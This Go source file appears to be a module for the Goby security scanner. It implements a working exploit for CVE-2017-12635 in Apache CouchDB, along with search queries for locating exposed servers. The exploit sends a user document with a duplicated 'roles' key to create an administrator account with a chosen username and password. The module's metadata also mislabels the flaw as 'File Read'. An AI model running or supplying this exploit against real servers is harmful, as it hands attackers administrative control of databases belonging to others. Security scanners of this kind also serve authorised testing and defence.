package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Apache CouchDB Administrator Creates bypass roles (CVE-2017-12635)",
    "Description": "Due to the different parsing methods of JSON between Erlang and JavaScript, the statement execution is different. This vulnerability allows any user to create an administrator",
    "Impact": "Apache CouchDB Administrator Creates bypass roles (CVE-2017-12635)",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://github.com/apache/couchdb/releases\">https:// github.com/apache/couchdb/releases</a></p>",
    "Product": "CouchDB",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "Couchdb垂直权限绕过漏洞",
            "Description": "Apache CouchDB是美国阿帕奇（Apache）软件基金会的一个免费、开源、面向文档的数据库，是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。\nApache CouchDB 1.7.0之前的版本和2.1.1之前的2.x版本中存在权限提升漏洞，该漏洞源于基于rlang的JSON解析器和基于JavaScript的JSON解析器之间存在差异。攻击者可利用该漏洞访问任意的shell命令或获取管理员权限。\n影响版本：\nApache CouchDB <1.7.0\nApache CouchDB 2.x<2.1.1",
            "Impact": "<p>Apache CouchDB是美国阿帕奇（Apache）软件基金会的一个免费、开源、面向文档的数据库，是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。</p><p>Apache CouchDB 1.7.0之前的版本和2.1.1之前的2.x版本中存在权限提升漏洞，该漏洞源于基于rlang的JSON解析器和基于JavaScript的JSON解析器之间存在差异。攻击者可利用该漏洞访问任意的shell命令或获取管理员权限。</p><p>影响版本：</p><p>Apache CouchDB &lt;1.7.0</p><p>Apache CouchDB 2.x&lt;2.1.1</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://github.com/apache/couchdb/releases\" target=\"_blank\">https://github.com/apache/couchdb/releases</a></p>",
            "Product": "APACHE-CouchDB",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Apache CouchDB Administrator Creates bypass roles (CVE-2017-12635)",
            "Description": "Due to the different parsing methods of JSON between Erlang and JavaScript, the statement execution is different. This vulnerability allows any user to create an administrator",
            "Impact": "Apache CouchDB Administrator Creates bypass roles (CVE-2017-12635)",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://github.com/apache/couchdb/releases\" target=\"_blank\">https:// github.com/apache/couchdb/releases</a></p>",
            "Product": "CouchDB",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "((header=\"CouchDB\" && header=\"200 OK\" && body=\"{\\\"couchdb\\\":\\\"Welcome\\\",\" && body=\"\\\"version\\\"\") || (header=\"CouchDB\" && header=\"X-Couchdb-Body-Time: 0\") || protocol=\"couchdb\" || (body=\"\\\"couchdb\\\":\\\"welcome\\\"\" && body!=\"Server: Boa\"))",
    "GobyQuery": "((header=\"CouchDB\" && header=\"200 OK\" && body=\"{\\\"couchdb\\\":\\\"Welcome\\\",\" && body=\"\\\"version\\\"\") || (header=\"CouchDB\" && header=\"X-Couchdb-Body-Time: 0\") || protocol=\"couchdb\" || (body=\"\\\"couchdb\\\":\\\"welcome\\\"\" && body!=\"Server: Boa\"))",
    "Author": "1291904552@qq.com",
    "Homepage": "https://couchdb.apache.org/",
    "DisclosureDate": "2017-11-15",
    "References": [
        "https://www.wangan.com/docs/294"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [
        "CVE-2017-12635"
    ],
    "CNVD": [
        "CNVD-2017-34233 "
    ],
    "CNNVD": [
        "CNNVD-201711-487"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "user",
            "type": "input",
            "value": "CouchDB",
            "show": ""
        },
        {
            "name": "pass",
            "type": "input",
            "value": "CouchDB",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [
            "CouchDB"
        ],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			user := goutils.RandomHexString(4)
			uri_1 := "/_users/org.couchdb.user:" + user
			cfg_1 := httpclient.NewRequestConfig("PUT", uri_1)
			cfg_1.VerifyTls = false
			cfg_1.Header.Store("Content-Type", "application/json")
			cfg_1.Data = fmt.Sprintf(`{"type": "user","name": "%s","roles": ["_admin"],"roles": [],"password": "CouchDB"}`, user)
			if resp_1, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
				if resp_1.StatusCode == 201 && strings.Contains(resp_1.Utf8Html, "\"ok\":true") {
					rev := regexp.MustCompile(`rev":"(.*?)"`).FindAllStringSubmatch(resp_1.Utf8Html, -1)
					uri_2 := "/_session"
					cfg_2 := httpclient.NewPostRequestConfig(uri_2)
					cfg_2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg_2.Data = fmt.Sprintf("name=%s&password=CouchDB", user)
					if resp_2, err := httpclient.DoHttpRequest(u, cfg_2); err == nil {
						if resp_2.StatusCode == 200 {
							AuthSesssion := regexp.MustCompile("AuthSession=(.*?);").FindAllStringSubmatch(resp_2.HeaderString.String(), -1)
							uri_3 := "/_users/org.couchdb.user%3A" + user + "?rev=" + rev[0][1]
							cfg_3 := httpclient.NewRequestConfig("DELETE", uri_3)
							cfg_3.VerifyTls = false
							cfg_3.Header.Store("Cookie", "AuthSession="+AuthSesssion[0][1])
							if resp_3, err := httpclient.DoHttpRequest(u, cfg_3); err == nil {
								if resp_3.StatusCode == 200 {
									return true
								}
							}
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			user := ss.Params["user"].(string)
			pass := ss.Params["pass"].(string)
			uri := "/_users/org.couchdb.user:" + user
			cfg := httpclient.NewRequestConfig("PUT", uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = fmt.Sprintf(`{"type": "user","name": "%s","roles": ["_admin"],"roles": [],"password": "%s"}`, user, pass)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 201 && strings.Contains(resp.Utf8Html, "\"ok\":true") {
					expResult.Output = resp.Utf8Html
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
